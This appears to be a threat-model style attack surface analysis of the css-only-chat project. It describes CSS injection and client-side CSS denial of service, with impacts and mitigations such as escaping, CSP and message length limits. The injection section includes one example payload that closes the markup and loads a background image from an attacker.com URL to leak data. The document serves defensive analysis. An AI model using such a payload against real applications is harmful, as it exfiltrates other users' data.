# Attack Surface Analysis for kkuchta/css-only-chat

## Attack Surface: [Malicious CSS Injection](./attack_surfaces/malicious_css_injection.md)

* **Description:** An attacker crafts a message that, when encoded into CSS, injects malicious CSS properties or selectors into other users' browsers.
* **How CSS-Only Chat Contributes:** The fundamental mechanism of the application involves encoding user-provided text into CSS attributes and selectors. This direct translation of user input into browser-interpreted CSS creates an avenue for injecting arbitrary styles.
* **Example:** A user sends a message like `"><style> body { background-image: url(https://attacker.com/leak?data=sensitive-info); }</style>`. When encoded into CSS, this could cause other users' browsers to send requests to the attacker's server, potentially leaking information.
* **Impact:**
    * **Data Exfiltration:** Leaking user data or application state to an attacker's server.
    * **UI Defacement:** Altering the appearance of the chat interface for other users, potentially leading to confusion or misinformation.
    * **Denial of Service (Client-Side):** Injecting CSS that causes excessive browser rendering or resource consumption, making the application unusable for other users.
* **Risk Severity:** High to Critical (depending on the potential for data exfiltration).
* **Mitigation Strategies:**
    * **Strict Output Encoding/Escaping:** Implement robust encoding mechanisms that sanitize user input before converting it into CSS, preventing the injection of special characters or HTML/CSS syntax.
    * **Content Security Policy (CSP):** While limited in this context, a restrictive CSP can help mitigate some forms of data exfiltration by limiting the domains to which the browser can make requests.
    * **CSS Sanitization Libraries:** Explore using libraries specifically designed to sanitize CSS to remove potentially harmful properties or selectors.
    * **Input Validation:** Implement checks on the length and characters allowed in user messages before encoding them into CSS.

## Attack Surface: [CSS Denial of Service (Client-Side)](./attack_surfaces/css_denial_of_service__client-side_.md)

* **Description:** An attacker crafts a message that, when encoded into CSS, generates an extremely large or complex CSS structure that overwhelms the browser's rendering engine.
* **How CSS-Only Chat Contributes:** The application's reliance on dynamically generating CSS based on user input makes it susceptible to attacks that exploit the browser's CSS parsing and rendering capabilities.
* **Example:** A user sends a very long message or a message containing many unique characters that, when encoded, results in thousands of CSS rules or highly specific selectors, causing the browser to freeze or become unresponsive.
* **Impact:**
    * **Temporary Unavailability:**  Users experience performance degradation or complete unresponsiveness of the chat application in their browser.
    * **Resource Exhaustion:**  Excessive CSS can consume significant client-side resources (CPU, memory).
* **Risk Severity:** Medium to High (depending on the ease of triggering and the severity of the impact).
* **Mitigation Strategies:**
    * **Limiting Message Length:** Restrict the maximum length of user messages to prevent the generation of excessively large CSS.
    * **CSS Complexity Limits:** Implement logic to detect and prevent the generation of overly complex CSS selectors or a large number of CSS rules from a single message.
    * **Throttling/Rate Limiting:** Limit the frequency with which users can send messages to prevent rapid generation of large amounts of CSS.
